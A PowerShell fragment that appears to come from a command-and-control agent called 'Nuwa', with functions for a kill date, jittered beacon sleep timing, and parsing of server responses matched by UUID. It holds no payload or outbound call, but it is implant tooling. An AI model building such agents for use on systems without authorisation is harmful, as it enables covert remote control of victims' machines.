function Test-NuwaKilldatePassed {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [string]$Killdate
    )

    if ([string]::IsNullOrWhiteSpace($Killdate)) {
        return $false
    }

    return (Get-Date) -ge (Get-Date -Date $Killdate)
}

function Get-NuwaSleepDurationSeconds {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [double]$Interval,

        [Parameter(Mandatory = $true)]
        [double]$Jitter,

        [Parameter(Mandatory = $false)]
        [double]$JitterSample = -1
    )

    if ($Jitter -le 0) {
        return [double]$Interval
    }

    $sample = if ($JitterSample -ge 0) {
        $JitterSample
    } else {
        (Get-Random -Minimum 0.0 -Maximum 1.0)
    }

    return [Math]::Round(($Interval + ($Interval * ($Jitter / 100.0) * $sample)), 3)
}

function ConvertFrom-NuwaResponseBody {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [AllowEmptyString()]
        [string]$ResponseBody,

        [Parameter(Mandatory = $true)]
        [string]$ExpectedUuid,

        [Parameter(Mandatory = $true)]
        [hashtable]$Context,

        [Parameter(Mandatory = $false)]
        [int]$UuidLength = 36
    )

    if ([string]::IsNullOrWhiteSpace($ResponseBody)) {
        return $null
    }

    $trimmedBody = $ResponseBody.Trim()
    $trimmedBody = $trimmedBody.TrimStart([char]0xFEFF)
    $markerIndex = $trimmedBody.IndexOf('NW1:')
    if ($markerIndex -gt 0) {
        $trimmedBody = $trimmedBody.Substring($markerIndex)
    }

    try {
        return ConvertFrom-NuwaWireBytes -WireBytes (ConvertTo-NuwaUtf8Bytes -Value $trimmedBody) -Context $Context
    } catch {
        if ($markerIndex -ge 0) {
            throw
        }
    }

    $decodedEnvelope = ConvertFrom-NuwaTransportEnvelope -Envelope $trimmedBody -UuidLength $UuidLength
    if (-not [string]::IsNullOrWhiteSpace($ExpectedUuid) -and $decodedEnvelope.uuid -ne $ExpectedUuid) {
        throw ("Response UUID mismatch: expected '{0}' but received '{1}'" -f $ExpectedUuid, $decodedEnvelope.uuid)
    }

    return ConvertFrom-NuwaWireBytes -WireBytes $decodedEnvelope.message_bytes -Context $Context
}
